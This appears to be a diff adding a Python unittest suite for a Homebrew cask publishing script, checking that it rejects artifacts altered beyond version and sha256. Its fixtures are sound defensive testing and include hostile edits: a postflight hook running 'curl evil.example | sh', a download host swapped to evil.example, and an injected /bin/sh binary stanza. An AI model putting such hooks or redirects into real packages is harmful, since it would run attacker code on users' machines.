@@ -1,0 +1,162 @@
+#!/usr/bin/env python3
+import os
+from pathlib import Path
+import re
+import shutil
+import subprocess
+import tempfile
+import unittest
+
+
+HERE = Path(__file__).resolve().parent
+SCRIPT = HERE / "publish-mouthtype-cask.sh"
+REAL_CASK = HERE.parent / "Casks/mouthtype.rb"
+CREDENTIAL = "s3cret-credential-value"
+NEW_SHA = "a" * 64
+ERR_CHANGED = "changed more than version and sha256"
+
+# Stub git: everything goes to the real git except push, which is logged and
+# answered with PUSH_EXIT.
+GIT_STUB = """#!/usr/bin/env bash
+for arg in "$@"; do
+  if [ "$arg" = push ]; then
+    echo push >> "$PUSH_LOG"
+    exit "${PUSH_EXIT:-0}"
+  fi
+done
+exec "$REAL_GIT" "$@"
+"""
+
+
+def make_artifact(text=None, version="0.12.3", sha=NEW_SHA):
+    """The current cask with a new version and sha256, optionally post-edited."""
+    cask = REAL_CASK.read_text()
+    cask = re.sub(r'(?m)^(  version ")[^"]*(")$', rf"\g<1>{version}\2", cask)
+    cask = re.sub(r'(?m)^(  sha256 ")[^"]*(")$', rf"\g<1>{sha}\2", cask)
+    return cask if text is None else text(cask)
+
+
+class PublishTests(unittest.TestCase):
+    def publish(self, artifact, version="0.12.3", push_exit=0, missing=False):
+        with tempfile.TemporaryDirectory() as directory:
+            root = Path(directory)
+            (root / "scripts").mkdir()
+            shutil.copy(SCRIPT, root / "scripts/publish-mouthtype-cask.sh")
+            (root / "Casks").mkdir()
+            shutil.copy(REAL_CASK, root / "Casks/mouthtype.rb")
+            real_git = shutil.which("git")
+            env = dict(
+                os.environ,
+                GIT_AUTHOR_NAME="t", GIT_AUTHOR_EMAIL="t@example.com",
+                GIT_COMMITTER_NAME="t", GIT_COMMITTER_EMAIL="t@example.com",
+                GIT_CONFIG_GLOBAL="/dev/null", GIT_CONFIG_SYSTEM="/dev/null")
+            for cmd in (["init", "-q", "-b", "main"], ["add", "-A"],
+                        ["commit", "-q", "-m", "init"]):
+                subprocess.run([real_git, *cmd], cwd=root, env=env, check=True)
+            (root / "bin").mkdir()
+            stub = root / "bin/git"
+            stub.write_text(GIT_STUB)
+            stub.chmod(0o755)
+            (root / "out").mkdir()
+            src = root / "out/mouthtype.rb"
+            if not missing:
+                src.write_text(artifact)
+            push_log = root / "push.log"
+            env.update(
+                PATH=f"{root / 'bin'}:{os.environ['PATH']}",
+                REAL_GIT=real_git, PUSH_LOG=str(push_log),
+                PUSH_EXIT=str(push_exit), VERSION=version,
+                GITHUB_TOKEN=CREDENTIAL, CASK_ARTIFACT=str(src),
+                RUNNER_TEMP=str(root / "nonexistent"))
+            result = subprocess.run(
+                ["bash", "scripts/publish-mouthtype-cask.sh"], cwd=root,
+                env=env, capture_output=True, text=True)
+            count = subprocess.run(
+                [real_git, "rev-list", "--count", "HEAD"], cwd=root, env=env,
+                capture_output=True, text=True, check=True).stdout.strip()
+            subject = subprocess.run(
+                [real_git, "log", "-1", "--format=%s"], cwd=root, env=env,
+                capture_output=True, text=True, check=True).stdout.strip()
+            return {
+                "result": result,
+                "commits": int(count),
+                "subject": subject,
+                "pushed": push_log.exists(),
+                "cask": (root / "Casks/mouthtype.rb").read_text(),
+                "gitconfig": (root / ".git/config").read_text(),
+            }
+
+    def assert_rejected(self, out, message=None):
+        self.assertEqual(out["result"].returncode, 1, out["result"].stdout + out["result"].stderr)
+        self.assertEqual(out["commits"], 1)
+        self.assertFalse(out["pushed"])
+        if message:
+            self.assertIn(message, out["result"].stdout + out["result"].stderr)
+
+    def test_valid_update_is_committed_and_pushed(self):
+        artifact = make_artifact()
+        out = self.publish(artifact)
+        self.assertEqual(out["result"].returncode, 0, out["result"].stderr)
+        self.assertEqual(out["commits"], 2)
+        self.assertEqual(out["subject"], "build(cask): update mouthtype to 0.12.3")
+        self.assertTrue(out["pushed"])
+        self.assertEqual(out["cask"], artifact)
+        self.assertNotIn(CREDENTIAL, out["gitconfig"])
+
+    def test_identical_artifact_is_a_noop(self):
+        current = re.search(r'(?m)^  version "([^"]*)"$', REAL_CASK.read_text()).group(1)
+        out = self.publish(REAL_CASK.read_text(), version=current)
+        self.assertEqual(out["result"].returncode, 0, out["result"].stderr)
+        self.assertIn("nothing to commit", out["result"].stdout)
+        self.assertEqual(out["commits"], 1)
+        self.assertFalse(out["pushed"])
+
+    def test_missing_artifact(self):
+        self.assert_rejected(self.publish("", missing=True), "missing")
+
+    def test_bad_version(self):
+        for bad in ("0.12", "v0.12.3", "0.12.3-rc.1", "", "0.12.3\n0.1.0"):
+            with self.subTest(version=bad):
+                self.assert_rejected(
+                    self.publish(make_artifact(version=bad or "0.12.3"), version=bad))
+
+    def test_version_mismatch(self):
+        self.assert_rejected(self.publish(make_artifact(version="0.12.4")))
+
+    def test_malformed_sha256(self):
+        for sha in ("A" * 64, "a" * 63, "a" * 65, "g" * 64, ""):
+            with self.subTest(sha=sha):
+                self.assert_rejected(self.publish(make_artifact(sha=sha)))
+
+    def test_added_postflight_block(self):
+        art = make_artifact(lambda c: c.replace(
+            '  app "Mouthtype.app"\n',
+            '  app "Mouthtype.app"\n\n  postflight do\n    system "curl evil.example | sh"\n  end\n'))
+        self.assert_rejected(self.publish(art), ERR_CHANGED)
+
+    def test_changed_url_host(self):
+        art = make_artifact(lambda c: c.replace(
+            "https://github.com/", "https://evil.example/"))
+        self.assert_rejected(self.publish(art), ERR_CHANGED)
+
+    def test_extra_stanza(self):
+        art = make_artifact(lambda c: c.replace(
+            '  name "Mouthtype"\n', '  name "Mouthtype"\n  binary "/bin/sh"\n'))
+        self.assert_rejected(self.publish(art), ERR_CHANGED)
+
+    def test_duplicate_version_line(self):
+        art = make_artifact(lambda c: c.replace(
+            '  version "0.12.3"\n', '  version "0.12.3"\n  version "0.12.3"\n'))
+        self.assert_rejected(self.publish(art))
+
+    def test_header_comment_changed(self):
+        art = make_artifact(lambda c: c.replace("DO NOT EDIT.", "DO NOT EDIT!"))
+        self.assert_rejected(self.publish(art), ERR_CHANGED)
+
+    def test_push_failure(self):
+        out = self.publish(make_artifact(), push_exit=1)
+        self.assertNotEqual(out["result"].returncode, 0)
+
+
+if __name__ == "__main__":
+    unittest.main()
